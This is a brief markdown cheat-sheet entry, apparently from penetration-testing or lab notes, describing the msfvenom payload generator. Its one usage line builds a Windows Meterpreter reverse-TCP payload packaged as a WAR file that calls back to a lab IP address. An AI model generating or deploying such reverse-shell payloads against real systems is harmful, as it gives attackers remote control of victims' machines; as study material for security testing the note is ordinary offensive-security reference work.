# msfvenom

## Overview

msfvenom is a payload generator.
You can create reverse shells in many different formars

## Usage

Getting a war payload

	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.46 LPORT=9001 -f war -o payload.war


